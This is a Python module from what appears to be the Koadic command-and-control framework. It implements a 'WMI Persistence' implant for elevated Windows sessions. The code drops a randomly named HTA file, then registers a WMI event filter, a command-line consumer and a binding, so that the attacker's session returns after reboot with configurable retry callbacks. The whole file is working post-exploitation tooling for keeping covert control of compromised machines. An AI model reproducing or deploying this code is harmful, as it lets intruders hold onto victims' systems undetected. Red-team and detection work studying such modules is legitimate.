import core.job
import core.implant
import core.loader
import uuid
import string
import random

class WMIPersistJob(core.job.Job):
    def create(self):
        if self.session_id == -1:
            self.error("0", "This job is not yet compatible with ONESHOT stagers.", "ONESHOT job error", "")
            return False
        if self.session.elevated != 1:
            self.error("0", "This job requires an elevated session.", "Not elevated", "")
            return False
        id = self.options.get("PAYLOAD")
        payload = self.load_payload(id)
        self.options.set("CMD", payload)
        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
        self.options.set("FDROPDIR", self.options.get('DROPDIR').replace("\\", "\\\\").replace('"', '\\"'))

        if self.options.get('DROPFILE'):
            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
        else:
            self.options.set('DROPFILE', ''.join(random.choice(string.ascii_uppercase) for _ in range(10)))
            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')

    def report(self, handler, data, sanitize = False):
        task =  handler.get_header("Task", False)
        upload = handler.get_header('X-UploadFileJob', False)
        if upload == "true":
            dropper_script = core.loader.load_script(self.options.get("LDROPFILE"), self.options)
            template = core.loader.load_script("data/stager/js/mshta/template.hta")
            fdata = self.linter.post_process_script(dropper_script, template, self.options, self.session, False)

            headers = {}
            headers['Content-Type'] = 'application/octet-stream'
            headers['Content-Length'] = len(fdata)
            handler.reply(200, fdata, headers)
            return

        data = data.decode()

        if task == "CreateFilter":
            handler.reply(200)
            if data:
                self.shell.print_good("__EventFilter created!")
                self.shell.print_command("wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter WHERE Name=\"K0adic\" DELETE")
            else:
                self.shell.print_error("__EventFilter could not be created, this implant will probably fail :/")
            return

        if task == "CreateConsumer":
            handler.reply(200)
            if data:
                self.shell.print_good("CommandLineEventConsumer created!")
                self.shell.print_command("wmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer WHERE Name=\"K0adic\" DELETE")
            else:
                self.shell.print_error("CommandLineEventConsumer could not be created, this implant will probably fail :/")
            return

        if task == "CreateBinding":
            handler.reply(200)
            if data:
                self.shell.print_good("__FilterToConsumerBinding created! Persistence has been established! If the target reboots, a session should come back 4-5 minutes later :)")
                self.shell.print_command("wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding WHERE \"__PATH like '%K0adic%'\" DELETE")
            else:
                self.shell.print_error("__FilterToConsumerBinding could not be created, this implant will probably fail :/")
            return

        if task == "RemovePersistence":
            handler.reply(200)
            if data:
                self.shell.print_good("Persistence removed successfully.")
            else:
                self.shell.print_error("Could not remove persistence :/")
                self.shell.print_command("wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter WHERE Name=\"K0adic\" DELETE")
                self.shell.print_command("wmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer WHERE Name=\"K0adic\" DELETE")
                self.shell.print_command("wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding WHERE \"__PATH like '%K0adic%'\" DELETE")
            return

        if task == "AddDropper":
            handler.reply(200)
            if "true" in data.split("~~~")[0]:
                self.shell.print_good("HTA file dropped at "+data.split("~~~")[1].split()[0])
                self.shell.print_command("del /f "+data.split("~~~")[1].split()[0])
            else:
                self.shell.print_error("HTA file could not be dropped. Consider cleaning up and choosing a different DROPDIR.")
            return

        if task == "DeleteDropper":
            handler.reply(200)
            if "false" in data.split("~~~")[0]:
                self.shell.print_good("HTA file deleted from "+data.split("~~~")[1].split()[0])
            else:
                self.shell.print_error("HTA file could not be deleted.")
                self.shell.print_command("del /f "+data.split("~~~")[1].split()[0])
            return

        if data == "Complete":
            super(WMIPersistJob, self).report(handler, data)
            
        handler.reply(200)

    def done(self):
        self.results = "Completed"
        self.display()

    def display(self):
        # self.shell.print_plain(self.data)
        pass

class WMIPersistImplant(core.implant.Implant):

    NAME = "WMI Persistence"
    DESCRIPTION = "Creates persistence using a WMI subscription"
    AUTHORS = ["TheNaterz"]
    STATE = "implant/persist/wmi"

    def load(self):
        self.options.register("PAYLOAD", "", "payload to stage")
        self.options.register("CMD", "", "command", hidden=True)
        self.options.register("CLEANUP", "false", "will remove the created user", enum=["true", "false"])
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory for output", required=False)
        self.options.register("LDROPFILE", "data/implant/persist/wmi.dropper", "local file to drop on the target", advanced=True)
        self.options.register("DROPDIR", "%ALLUSERSPROFILE%", "directory to place the drop file", advanced=True)
        self.options.register("FDROPDIR", "", "", hidden=True)
        self.options.register("RETRYATTEMPTS", "5", "number of times to retry calling back before self-terminating (-1 == infinite)")
        self.options.register("RETRYDELAY", "60", "seconds between retry attempts")
        self.options.register("DROPFILE", "", "name to give the drop file (randomly generated if no name)", advanced=True)
        self.options.register("FDROPFILE", "", "", hidden=True)

    def job(self):
        return WMIPersistJob

    def run(self):
        id = self.options.get("PAYLOAD")
        payload = self.load_payload(id)

        if payload is None:
            self.shell.print_error("Payload %s not found." % id)
            return

        payloads = {}
        payloads["js"] = "data/implant/persist/wmi.js"

        self.dispatch(payloads, self.job)
